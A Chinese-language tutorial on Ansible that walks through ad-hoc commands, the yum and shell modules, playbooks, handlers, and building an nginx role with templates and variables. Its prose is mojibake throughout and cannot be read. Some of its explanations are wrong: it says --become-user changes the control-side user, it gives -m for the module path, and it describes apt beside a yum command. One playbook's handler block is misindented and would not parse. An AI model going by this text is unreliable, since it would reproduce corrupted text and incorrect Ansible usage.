ä¸ºansibleä½¿ç”¨sshï¼Œæ‰€ä»¥å®ƒéœ€è¦èƒ½å¤Ÿsshè¿æ¥åˆ°æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œansibleå°†å°è¯•ä»¥æ­£åœ¨è¿è¡Œçš„å½“å‰ç”¨æˆ·èº«ä»½è¿›è¡Œè¿æ¥ã€‚å¦‚æœæˆ‘æ­£åœ¨è¿è¡Œansibleçš„ç”¨æˆ·æ˜¯ubuntuï¼Œå®ƒå°†å°è¯•ä»¥ubuntuè¿æ¥å…¶ä»–æœåŠ¡å™¨ã€‚\n\nNote: æ§åˆ¶ç«¯å’Œè¢«æ§ç«¯çš„ç”¨æˆ·å¾ˆæ˜¾ç„¶ä¼šä¸ä¸€æ ·ã€‚\n\n```bash\nwhoami # levonfly\n\nansible -i ./hosts --connection=local local -m ping\n127.0.0.1 | SUCCESS => {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\n\n\nansible -i ./hosts remote -m ping\n192.168.1.2 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: ssh: connect to host 192.168.1.2 port 22: Operation timed out\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n\n\n+ ä½¿ç”¨â€“connection=localå‘Šè¯‰ansibleä¸å°è¯•é€šè¿‡sshè¿è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬åªæ˜¯å½±å“æœ¬åœ°ä¸»æœºã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦ä¸€ä¸ªhostsæ–‡ä»¶ï¼Œå‘Šè¯‰æˆ‘ä»¬è¿æ¥åˆ°å“ªé‡Œã€‚ \n\n+ åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»ansibleå¾—åˆ°çš„è¾“å‡ºæ˜¯ä¸€äº›jsonï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬taskï¼ˆæˆ‘ä»¬å¯¹pingæ¨¡å—çš„è°ƒç”¨ï¼‰æ˜¯å¦è¿›è¡Œäº†ä»»ä½•æ›´æ”¹å’Œç»“æœã€‚\n\n\n\nå‘½ä»¤è¯´æ˜ï¼š\n\n```bash\n-i ./hosts \t\t\t\t# è®¾ç½®åº“å­˜æ–‡ä»¶ï¼Œå‘½åä¸º hosts\nremoteï¼Œlocalï¼Œall # ä½¿ç”¨è¿™ä¸ªæ ‡ç­¾çš„ä¸‹å®šä¹‰çš„æœåŠ¡å™¨hostsæ¸…å•æ–‡ä»¶ã€‚â€œallâ€æ˜¯é’ˆå¯¹æ–‡ä»¶ä¸­å®šä¹‰çš„æ¯ä¸ªæœåŠ¡å™¨è¿è¡Œçš„ç‰¹æ®Šå…³é”®å­—, æ³¨æ„allæ¯”è¾ƒç‰¹æ®Š\n-m ping # ä½¿ç”¨â€œpingâ€æ¨¡å—ï¼Œå®ƒåªæ˜¯è¿è¡Œpingå‘½ä»¤å¹¶è¿”å›ç»“æœ\n-c local| --connection=local # åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šè¿è¡Œå‘½ä»¤ï¼Œè€Œä¸æ˜¯SSH\n\nä¸€äº›å¸¸ç”¨å‘½ä»¤ï¼š\n-i PATH --inventory=PATH # æŒ‡å®šhostæ–‡ä»¶çš„è·¯å¾„ï¼Œé»˜è®¤æ˜¯åœ¨/etc/ansible/hosts\n--private-key=PRIVATE_KEY_FILE_PATH # ä½¿ç”¨æŒ‡å®šè·¯å¾„çš„ç§˜é’¥å»ºç«‹è®¤è¯è¿æ¥\n-m DIRECTORY --module-path=DIRECTORY #æŒ‡å®šmoduleçš„ç›®å½•æ¥åŠ è½½moduleï¼Œé»˜è®¤æ˜¯/usr/share/ansible\n-c CONNECTION --connection=CONNECTION #æŒ‡å®šå»ºç«‹è¿æ¥çš„ç±»å‹ï¼Œä¸€èˆ¬æœ‰ssh ï¼Œlocal\n```\n\n\n\n##### 3.1 æ¨¡å—ï¼ˆmodulesï¼‰\n\nansibleä½¿ç”¨â€œæ¨¡å—â€æ¥å®Œæˆå¤§éƒ¨åˆ†çš„ä»»åŠ¡ã€‚æ¨¡å—å¯ä»¥åšå®‰è£…è½¯ä»¶ï¼Œå¤åˆ¶æ–‡ä»¶ï¼Œä½¿ç”¨æ¨¡æ¿ç­‰ç­‰ã€‚\n\nå¦‚æœæˆ‘ä»¬æ²¡æœ‰æ¨¡å—ï¼Œæˆ‘ä»¬å°†è¿è¡Œä»»æ„çš„shellå‘½ä»¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨bashè„šæœ¬ã€‚è¿™æ˜¯ä¸€ä¸ªä»»æ„shellå‘½ä»¤çœ‹èµ·æ¥åƒåœ¨ansibleï¼ˆå®ƒä½¿ç”¨çš„shellæ¨¡å—ï¼ï¼‰ï¼š\n\n```bash\n# åœ¨æœ¬åœ°æ‰§è¡Œlså‘½ä»¤\nansible -i ./hosts local --connection=local -m shell -a 'ls'\n\n127.0.0.1 | SUCCESS | rc=0 >>\nREADME.md\nhosts\nnginx.yml\nroles\n\n# åœ¨è¿œç¨‹å®‰è£…nginx, æ³¨æ„--become-user=rootæ˜¯æ”¹å˜æ§åˆ¶ç«¯çš„ç”¨æˆ·, ä¸æ˜¯è¢«æ§ç«¯\nansible -i ./hosts remote -b --become-user=root -m shell -a 'yum install nginx'\n172.24.120.46 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: liuwei@172.24.120.46: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).\\r\\n\",\n    \"unreachable\": true\n}\n```\n\nå‘½ä»¤è¯´æ˜:\n\n```bash\n-b # â€œæˆä¸ºâ€ï¼Œåœ¨è¿è¡Œå‘½ä»¤æ—¶å‘Šè¯‰å¯ä»¥æˆä¸ºå¦ä¸€ä¸ªç”¨æˆ·ã€‚\n--become-user=root # ä»¥ç”¨æˆ·â€œrootâ€è¿è¡Œä»¥ä¸‹å‘½ä»¤, æ˜¯æ”¹å˜æ§åˆ¶ç«¯çš„ç”¨æˆ·, ä¸æ˜¯è¢«æ§ç«¯!!!\n\n-a #ç”¨äºå°†ä»»ä½•å‚æ•°ä¼ é€’ç»™-må®šä¹‰çš„æ¨¡å—\n```\n\n\n\nè¦åœ¨centosæœåŠ¡å™¨ä¸Šå®‰è£…è½¯ä»¶ï¼Œâ€œyumâ€æ¨¡å—å°†è¿è¡Œç›¸åŒçš„å‘½ä»¤ï¼Œä½†ç¡®ä¿å¹‚ç­‰ã€‚\n\n```bash\n# æŒ‡å®šrootç”¨æˆ·yumå®‰è£…nginx\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u root -k\n\nNo config file found; using defaults\nSSH password: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n\n\n# æŒ‡å®šæ™®é€šç”¨æˆ·yumå®‰è£…nginx, å¹¶ä¸”è¾“å…¥sudoå¯†ç \nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u liuwei -k -s -K \nSSH password: xxx\nSUDO password[defaults to SSH password]: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n```\n\nå‘½ä»¤è¯´æ˜:\n\n```bash\n-v   \t # verbose mode, (-vvv for more, -vvvv to enable connection debugging)\n-m apt # ä½¿ç”¨aptæ¨¡å—\n-a 'name=nginx state=installed update_cache=true' # æä¾›aptæ¨¡å—çš„å‚æ•°ï¼ŒåŒ…æ‹¬è½¯ä»¶åŒ…åç§°ï¼Œæ‰€éœ€çš„ç»“æŸçŠ¶æ€ä»¥åŠæ˜¯å¦æ›´æ–°è½¯ä»¶åŒ…å­˜å‚¨åº“ç¼“å­˜\n\nå¸¸ç”¨å‘½ä»¤ï¼š\n-u USERNAME | --user=USERNAME #æŒ‡å®šè¢«æ§ç«¯çš„æ‰§è¡Œç”¨æˆ·\n-k | --ask-pass  #æç¤ºè¾“å…¥sshçš„å¯†ç ï¼Œè€Œä¸æ˜¯ä½¿ç”¨åŸºäºsshçš„å¯†é’¥è®¤è¯\n\n-s | --sudo  #æŒ‡å®šç”¨æˆ·çš„æ—¶å€™ï¼Œä½¿ç”¨sudoè·å¾—rootæƒé™\n-K | --ask-sudo-pass #æç¤ºè¾“å…¥sudoå¯†ç ï¼Œä¸--sudoä¸€èµ·ä½¿ç”¨\n```\n\nè¿™å°†ä½¿ç”¨yumæ¨¡å—æ¥æ›´æ–°å­˜å‚¨åº“ç¼“å­˜å¹¶å®‰è£…nginxï¼ˆå¦‚æœæ²¡æœ‰å®‰è£…ï¼‰ã€‚ è¿è¡Œä»»åŠ¡çš„ç»“æœæ˜¯â€changedâ€: falseã€‚è¿™è¡¨æ˜æ²¡æœ‰å˜åŒ–; æˆ‘å·²ç»ä½¿ç”¨è¯¥shellæ¨¡å—å®‰è£…äº†nginx ã€‚å¥½çš„æ˜¯ï¼Œæˆ‘å¯ä»¥ä¸€éåˆä¸€éåœ°è¿è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œè€Œä¸ç”¨æ‹…å¿ƒå®ƒä¼šæ”¹å˜é¢„æœŸçš„ç»“æœ - nginxå·²ç»å®‰è£…ï¼ŒansibleçŸ¥é“ï¼Œå¹¶ä¸”ä¸å°è¯•é‡æ–°å®‰è£…å®ƒã€‚ \n\n\n\n##### 3.2 å‰§æœ¬ï¼ˆplaybooksï¼‰\n\nplaybookå¯ä»¥è¿è¡Œå¤šä¸ªä»»åŠ¡ï¼Œå¹¶æä¾›ä¸€äº›æ›´é«˜çº§çš„åŠŸèƒ½ã€‚è®©æˆ‘ä»¬å°†ä¸Šè¿°ä»»åŠ¡ç§»åˆ°ä¸€æœ¬å‰§æœ¬ä¸­ã€‚åœ¨ansibleä¸­å‰§æœ¬ï¼ˆplaybooksï¼‰å’Œè§’è‰²ï¼ˆrolesï¼‰éƒ½ä½¿ç”¨yamlæ–‡ä»¶å®šä¹‰ã€‚ \n\nnginx.ymlï¼š(é€šè¿‡yamlå†™æ‰€éœ€å‚æ•°)\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n```\n\n\n\nè¿™å°†ä½¿ç”¨inventoryæ–‡ä»¶ä¸­[remote]æ ‡ç­¾ä¸‹çš„æœåŠ¡å™¨hostsã€‚åœ¨æˆ‘ä»¬çš„tasksæ–‡ä»¶ä¸­ä½¿ç”¨becomeå¹¶become_userå†æ¬¡ä½¿ç”¨ansibleæ¥sudoä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ï¼Œç„¶åä¼ é€’playbookæ–‡ä»¶ã€‚ä½¿ç”¨ä¸€ä¸ªyaml playbookæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨è¿™ä¸ªansible-playbookå‘½ä»¤ï¼š\n\n\n\n```bash\nansible-playbook -i ./hosts nginx.yml -k -K\nSSH password:\nSUDO password[defaults to SSH password]:\n\nPLAY [remote] ***************************************************************************************************************************************************************************\n\nTASK [Gathering Facts] ******************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nTASK [Install Nginx] ********************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nPLAY RECAP ******************************************************************************************************************************************************************************\n172.24.120.46              : ok=2    changed=0    unreachable=0    failed=0\n```\n\næˆ‘ä»¬åœ¨è¿è¡Œè¿‡ç¨‹ä¸­è·å¾—äº†ä¸€äº›æœ‰ç”¨çš„åé¦ˆï¼ŒåŒ…æ‹¬â€œå¯æ‰§è¡Œä»»åŠ¡â€è¿è¡ŒåŠå…¶ç»“æœã€‚åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æ‰€æœ‰è¿è¡Œéƒ½okï¼Œä½†æ²¡æœ‰æ”¹å˜ã€‚\n\n\n\n##### 3.3 å¤„ç†ç¨‹åºï¼ˆhandlersï¼‰\n\nå¤„ç†ç¨‹åºä¸ä»»åŠ¡å®Œå…¨ç›¸åŒï¼ˆå®ƒå¯ä»¥åštaskå¯ä»¥åšçš„ä»»ä½•äº‹ï¼‰ï¼Œä½†åªæœ‰å½“å¦ä¸€ä¸ªä»»åŠ¡è°ƒç”¨å®ƒæ—¶æ‰ä¼šè¿è¡Œã€‚æ‚¨å¯ä»¥å°†å…¶è§†ä¸ºäº‹ä»¶ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†; å¤„ç†ç¨‹åºå°†é€šè¿‡å…¶ä¾¦å¬çš„äº‹ä»¶è°ƒç”¨è¿›è¡Œæ“ä½œã€‚ è¿™å¯¹äºè¿è¡Œä»»åŠ¡åå¯èƒ½éœ€è¦çš„â€œè¾…åŠ©â€æ“ä½œéå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚åœ¨é…ç½®æ›´æ”¹åå®‰è£…æˆ–é‡æ–°åŠ è½½æœåŠ¡åå¯åŠ¨æ–°æœåŠ¡ã€‚\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n     notify: #å¤åˆ¶çš„æ—¶å€™, è¦æ³¨æ„ç©ºæ ¼, å¯¹é½\n      - Start Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n```\n\nè¿™é‡Œæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªnotifyæŒ‡ä»¤åˆ°å®‰è£…ä»»åŠ¡ã€‚è¿™å°†åœ¨ä»»åŠ¡è¿è¡Œåé€šçŸ¥åä¸ºâ€œStart Nginxâ€çš„å¤„ç†ç¨‹åºã€‚ç„¶åæˆ‘ä»¬å¯ä»¥åˆ›å»ºåä¸ºâ€œStart Nginxâ€çš„å¤„ç†ç¨‹åºã€‚æ­¤å¤„ç†ç¨‹åºæ˜¯é€šçŸ¥â€œStart Nginxâ€æ—¶è°ƒç”¨çš„ä»»åŠ¡ã€‚ è¿™ä¸ªç‰¹å®šçš„å¤„ç†ç¨‹åºä½¿ç”¨æœåŠ¡æ¨¡å—ï¼Œå®ƒå¯ä»¥å¯åŠ¨ï¼Œåœæ­¢ï¼Œé‡å¯ï¼Œé‡æ–°åŠ è½½ï¼ˆç­‰ç­‰ï¼‰ç³»ç»ŸæœåŠ¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å‘Šè¯‰ansibleï¼Œæˆ‘ä»¬è¦å¯åŠ¨Nginxã€‚ \n\n+ å¦‚æœæˆ‘å·²ç»å®‰è£…äº†nginxï¼Œåˆ™å®‰è£…nginxä»»åŠ¡å°†ä¸ä¼šè¿è¡Œï¼Œé€šçŸ¥ç¨‹åºä¹Ÿå°†ä¸ä¼šè¢«è°ƒç”¨ã€‚\n\n\n\n##### 3.4 æ›´å¤šçš„ä»»åŠ¡ï¼ˆmore tasksï¼‰\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ­¤playbookæ·»åŠ æ›´å¤šçš„ä»»åŠ¡ï¼Œå¹¶æ¢ç´¢å…¶ä»–ä¸€äº›åŠŸèƒ½ã€‚\n\n```yaml\n- hosts: local\n  connection: local\n  become: yes\n  become_user: root\n  vars:\n   - docroot: /var/www/serversforhackers.com/public\n  tasks:\n   - name: Add Nginx Repository\n     apt_repository:\n       repo: ppa:nginx/stable\n       state: present\n     register: ppastable\n\n   - name: Install Nginx\n     apt:\n       pkg: nginx\n       state: installed\n       update_cache: true\n     when: ppastable|success\n     notify:\n      - Start Nginx\n\n   - name: Create Web Root\n     file:\n      path: '{{ docroot }}'\n      mode: 775\n      state: directory\n      owner: www-data\n      group: www-data\n     notify:\n      - Reload Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n\n    - name: Reload Nginx\n      service:\n        name: nginx\n        state: reloaded\n```\n\nç°åœ¨æœ‰ä¸‰ä¸ªä»»åŠ¡ï¼š\n\n```bash\nAdd Nginx Repository # ä½¿ç”¨apt_repositoryæ¨¡å—æ·»åŠ Nginxç¨³å®šPPAä»¥è·å–æœ€æ–°çš„ç¨³å®šç‰ˆæœ¬çš„Nginx ã€‚\nInstall Nginx \t\t   # ä½¿ç”¨aptæ¨¡å—å®‰è£…Nginxã€‚\nCreate Web Root      # æœ€ååˆ›å»ºä¸€ä¸ªWebæ ¹ç›®å½•ã€‚\n```\n\næ–°çš„registerå’ŒwhenæŒ‡ä»¤ï¼Œå¯ä»¥å®ç°åœ¨æŸäº›äº‹æƒ…å‘ç”Ÿåè®©ansibleæ‰§è¡Œä»»åŠ¡çš„åŠŸèƒ½ã€‚\n\næ‚¨è¿˜å¯ä»¥æ³¨å†Œæ¨¡å—æ“ä½œçš„ç»“æœï¼Œå¹¶ä½¿ç”¨å®šä¹‰çš„å˜é‡æ ¹æ®æ³¨å†Œï¼ˆregisterï¼‰çš„å˜é‡å€¼æœ‰æ¡ä»¶ï¼ˆwhenï¼‰åœ°æ‰§è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼Œæ³¨å†Œé€šè¿‡shellæ¨¡å—è¿è¡Œå‘½ä»¤çš„ç»“æœå¯ä»¥è®©æ‚¨è®¿é—®è¯¥å‘½ä»¤çš„stdoutã€‚\n\nåŒæ—¶è¿˜ä½¿ç”¨äº†ä¸€ä¸ªå˜é‡, docrootå˜é‡åœ¨å®šä¹‰varséƒ¨åˆ†ã€‚ç„¶åå°†å…¶ç”¨ä½œåˆ›å»ºå®šä¹‰ç›®å½•çš„æ–‡ä»¶æ¨¡å—çš„ç›®æ ‡å‚æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpathé…ç½®ä½¿ç”¨æ‹¬å·{{ var-name }}ï¼Œè¿™æ˜¯Jinja2çš„æ¨¡æ¿ã€‚ä¸ºäº†ä½¿ansibleèƒ½å¤Ÿåœ¨æ‹¬å·å†…è§£æJinja2æ¨¡æ¿å˜é‡ï¼Œè¯¥è¡Œå¿…é¡»æ˜¯å•å¼•å·æˆ–åŒå¼•å· - ä¾‹å¦‚ï¼Œpath: '{{ docroot }}' è€Œä¸æ˜¯path: {{ docroot }}ã€‚ä¸ä½¿ç”¨å¼•å·å°†å¯¼è‡´é”™è¯¯ã€‚ è¿™ä¸ªplaybookå¯ä»¥ç”¨é€šå¸¸çš„å‘½ä»¤è¿è¡Œï¼š\n\n```\nansible-playbook -i ./hosts nginx.yml\n```\n\n\n\n### 4. ansibleè§’è‰²ï¼ˆrolesï¼‰\n\nè§’è‰²æ‰æ˜¯ansibleçš„ç²¾é«“, æ¯ä¸ªäººå¯ä»¥åšå‡ºè‡ªå·±çš„è§’è‰²è®©åˆ«äººä½¿ç”¨, ä¹Ÿå¯ä»¥é€šè¿‡ansible-galaxyå®‰è£…å…¶ä»–äººçš„è§’è‰²ã€‚\n\nè§’è‰²å¾ˆé€‚åˆç»„ç»‡å¤šä¸ªç›¸å…³ä»»åŠ¡å¹¶å°è£…å®Œæˆè¿™äº›ä»»åŠ¡æ‰€éœ€çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œå®‰è£…nginxå¯èƒ½æ¶‰åŠæ·»åŠ è½¯ä»¶åŒ…å­˜å‚¨åº“ï¼Œå®‰è£…è½¯ä»¶åŒ…å’Œè®¾ç½®é…ç½®ã€‚ \n\næ­¤å¤–ï¼ŒçœŸå®çš„é…ç½®é€šå¸¸éœ€è¦é¢å¤–çš„æ•°æ®ï¼Œå¦‚å˜é‡ï¼Œæ–‡ä»¶ï¼ŒåŠ¨æ€æ¨¡æ¿ç­‰ç­‰ã€‚è¿™äº›å·¥å…·å¯ä»¥ä¸Playbookä¸€èµ·ä½¿ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ç›¸å…³ä»»åŠ¡å’Œæ•°æ®ç»„ç»‡æˆä¸€ä¸ªè§’è‰²ï¼ˆroleï¼Œ ç›¸å…³çš„ç»“æ„ï¼‰å¾ˆå¿«å°±èƒ½åšå¾—æ›´å¥½ã€‚ \n\nè§’è‰²æœ‰ä¸€ä¸ªè¿™æ ·çš„ç›®å½•ç»“æ„ï¼š\n\n```\nroles\n  rolename\n   - files\n   - handlers\n   - meta\n   - templates\n   - tasks\n   - vars\n```\n\nåœ¨æ¯ä¸ªå­ç›®å½•ä¸­ï¼ˆegï¼š filesï¼Œhandlersç­‰ç­‰ï¼‰ï¼Œansibleå°†è‡ªåŠ¨æœç´¢å¹¶è¯»å–å«åšmain.ymlçš„yamlæ–‡ä»¶ã€‚ \n\næ¥ä¸‹æ¥æˆ‘ä»¬å°†åˆ†è§£nginx.ymlæ–‡ä»¶å†…å®¹ä¸ºä¸åŒçš„ç»„ä»¶ï¼Œå¹¶å°†æ¯ä¸ªç»„ä»¶æ”¾åœ¨ç›¸åº”çš„ç›®å½•ä¸­ï¼Œä»¥åˆ›å»ºä¸€ä¸ªæ›´å¹²å‡€ï¼Œæ›´å®Œæ•´çš„é…ç½®å·¥å…·é›†ã€‚\n\n\n\n##### 4.1 åˆ›å»ºè§’è‰²ï¼ˆcreating a roleï¼‰\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ansible-galaxyå‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªæ–°è§’è‰²ã€‚æ­¤å·¥å…·å¯ç”¨äºå°†è§’è‰²ä¿å­˜åˆ°ansibleçš„å…¬å…±æ³¨å†Œè¡¨ï¼Œä½†æ˜¯æˆ‘é€šå¸¸åªæ˜¯ä½¿ç”¨å®ƒæ¥åœ¨æœ¬åœ°åˆ›å»ºroleçš„åŸºç¡€ç›®å½•ç»“æ„ã€‚\n\n```bash\ncd ~/ansible-example\nmkdir roles\ncd roles\nansible-galaxy init nginx\n```\n\nç›®å½•åç§°rolesæ˜¯ä¸€ç§æƒ¯ä¾‹ï¼Œåœ¨è¿è¡Œä¸€ä¸ªplaybookæ—¶å¯ä»¥ç”¨æ¥æŸ¥æ‰¾è§’è‰²ã€‚è¯¥ç›®å½•åº”è¯¥å§‹ç»ˆè¢«å‘½årolesï¼Œä½†å¹¶ä¸å¼ºåˆ¶ã€‚åœ¨rolesç›®å½•ä¸­è¿è¡Œ ansible-galaxy init nginx å‘½ä»¤å°†åˆ›å»ºæ–°è§’è‰²æ‰€éœ€çš„ç›®å½•å’Œæ–‡ä»¶ã€‚\n\næˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬æ–°å»ºçš„nginxè§’è‰²çš„æ¯ä¸ªéƒ¨åˆ†~/ansible-example/roles/nginxã€‚\n\n##### 4.2.1 æ–‡ä»¶ï¼ˆfilesï¼‰\n\nfilesç›®å½•ä¸­æ²¡æœ‰main.ymlæ–‡ä»¶.  é¦–å…ˆï¼Œåœ¨filesç›®å½•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ æˆ‘ä»¬è¦å¤åˆ¶åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ã€‚å¯¹äºnginxï¼Œæˆ‘ç»å¸¸å¤åˆ¶h5bpçš„nginxç»„ä»¶é…ç½®ã€‚æˆ‘åªéœ€ä»githubä¸‹è½½æœ€æ–°çš„ä¿¡æ¯ï¼Œè¿›è¡Œä¸€äº›è°ƒæ•´ï¼Œå¹¶å°†å®ƒä»¬æ”¾å…¥filesç›®å½•ä¸­ã€‚\n\n```\n~/ansible-example\n - roles\n - - nginx\n - - - files\n - - - - h5bp\n```\n\næˆ‘ä»¬ç¨åä¼šçœ‹åˆ°ï¼Œh5bpé…ç½®æ–‡ä»¶å°†é€šè¿‡å¤åˆ¶æ¨¡å—æ·»åŠ åˆ°æœåŠ¡å™¨ã€‚\n\n\n\n##### 4.2.2 å¤„ç†ç¨‹åºï¼ˆhandlersï¼‰\n\nhandlersçº¦å®šå¿…é¡»åŒ…å«main.ymlæ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥æŠŠæ›¾ç»åœ¨nginx.yml å‰§æœ¬ä¸­çš„å®šä¹‰çš„æ‰€æœ‰å¤„ç†ç¨‹åºæ”¾å…¥åˆ°handlersç›®å½•ä¸­ã€‚\n\nhandlers/main.yml å†…å®¹ï¼š\n\n```yml\n---\n# handlers file for nginx\n\n- name: Start Nginx\n  service:\n    name: nginx\n    state: started\n\n- name: Reload Nginx\n  service:\n    name: nginx\n    state: reloaded\n```\n\nä¸€æ—¦handlers/main.ymlä¸­çš„å¤„ç†ç¨‹åºå®šä¹‰å¥½äº†ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªç”±åœ°ä»å…¶ä»–çš„yamlé…ç½®ä¸­å¼•ç”¨å®ƒä»¬ã€‚\n\n\n\n##### 4.2.3 å…ƒï¼ˆmetaï¼‰\n\nmetaç›®å½•ä¸­çº¦å®šå¿…é¡»åŒ…å«main.ymlæ–‡ä»¶ã€‚main.ymlæ–‡ä»¶åŒ…å«roleå…ƒæ•°æ®ï¼ŒåŒ…å«çš„ä¾èµ–å…³ç³»ã€‚å¦‚æœè¿™ä¸ªè§’è‰²ä¾èµ–äºå¦ä¸€ä¸ªè§’è‰²ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œå®šä¹‰ã€‚ä¾‹å¦‚ï¼Œnginxè§’è‰²å–å†³äºå®‰è£…sslè¯ä¹¦çš„sslè§’è‰²ã€‚ \n\nmeta/main.yml å†…å®¹ï¼š\n\n```yml\n---\ndependencies:\n  - { role: ssl }\n```\n\nå¦‚æœæˆ‘è°ƒç”¨äº†â€œnginxâ€è§’è‰²ï¼Œå®ƒå°†å°è¯•é¦–å…ˆè¿è¡Œâ€œsslâ€è§’è‰²ã€‚ å¦åˆ™æˆ‘ä»¬å¯ä»¥çœç•¥æ­¤æ–‡ä»¶ï¼Œæˆ–å°†è§’è‰²å®šä¹‰ä¸ºæ²¡æœ‰ä¾èµ–å…³ç³»ï¼š\n\n```yml\n---\ndependencies: []\n```\n\n\n\n##### 4.2.4 æ¨¡æ¿ï¼ˆtemplatesï¼‰\n\ntemplatesç›®å½•ä¸­æ²¡æœ‰main.ymlæ–‡ä»¶ï¼ŒåªåŒ…å«.j2åç¼€çš„æ¨¡æ¿æ–‡ä»¶ã€‚ åŸºäºpythonçš„Jinja2æ¨¡æ¿å¼•æ“ï¼ˆå’Œdjangoçš„æ¨¡æ¿å¼•æ“å¾ˆç±»ä¼¼ï¼‰ï¼Œæ¨¡æ¿æ–‡ä»¶å¯ä»¥åŒ…å«æ¨¡æ¿å˜é‡ã€‚è¿™é‡Œçš„æ–‡ä»¶åº”è¯¥ä»¥.j2ä¸ºç±»å‹åç¼€ï¼ˆeg.uwsgi.j2ï¼‰ï¼Œæå€¡ä½†æ˜¯ä¸å¼ºåˆ¶ï¼Œä¹Ÿå¯ä»¥å–å…¶ä»–çš„åå­—ã€‚\n\nè¿™æ˜¯ä¸€ä¸ªnginxæœåŠ¡å™¨ï¼ˆâ€œè™šæ‹Ÿä¸»æœºâ€ï¼‰é…ç½®çš„ä¾‹å­ã€‚è¯·æ³¨æ„ï¼Œå®ƒä½¿ç”¨äº†ç¨ååœ¨vars/main.ymlæ–‡ä»¶ä¸­å®šä¹‰çš„ä¸€äº›å˜é‡ã€‚ æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­çš„nginxé…ç½®æ–‡ä»¶ä½äºtemplates/serversforhackers.com.conf.j2ï¼š\n\n```nginx\nserver {\n    # Enforce the use of HTTPS\n    listen 80 default_server;\n    server_name {{ domain }};\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl default_server;\n\n    root /var/www/{{ domain }}/public;\n    index index.html index.htm index.php;\n\n    access_log /var/log/nginx/{{ domain }}.log;\n    error_log  /var/log/nginx/{{ domain }}-error.log error;\n\n    server_name {{ domain }};\n\n    charset utf-8;\n\n    include h5bp/basic.conf;\n\n    ssl_certificate           {{ ssl_crt }};\n    ssl_certificate_key       {{ ssl_key }};\n    include h5bp/directive-only/ssl.conf;\n\n    location / {\n        try_files $uri $uri/ /index.php$is_args$args;\n    }\n\n    location = /favicon.ico { log_not_found off; access_log off; }\n    location = /robots.txt  { log_not_found off; access_log off; }\n\n    location ~ \\.php$ {\n        include snippets/fastcgi.conf;\n        fastcgi_pass unix:/var/run/php7.1-fpm.sock;\n    }\n}\n```\n\nè¿™æ˜¯ä¸€ä¸ªç›¸å½“æ ‡å‡†çš„ç”¨äºphpåº”ç”¨ç¨‹åºçš„Nginxé…ç½®ã€‚è¿™é‡Œæœ‰ä¸‰ä¸ªå˜é‡ï¼š`domain` `ssl_crt` `ssl_key` è¿™ä¸‰ä¸ªå˜é‡å°†åœ¨å˜é‡éƒ¨åˆ†ï¼ˆvarsï¼‰ä¸­å®šä¹‰ã€‚\n\n##### 4.2.5 å˜é‡ï¼ˆvarsï¼‰\n\nvarsç›®å½•åŒ…å«ä¸€ä¸ªmain.ymlæ–‡ä»¶, åœ¨main.ymlä¸­æˆ‘ä»¬å¯ä»¥åˆ—å‡ºå°†è¦ä½¿ç”¨çš„æ‰€æœ‰å˜é‡ã€‚ \n\nvars/main.ymlï¼š\n\n```yml\n---\ndomain: serversforhackers.com\nssl_key: /etc/ssl/sfh/sfh.key\nssl_crt: 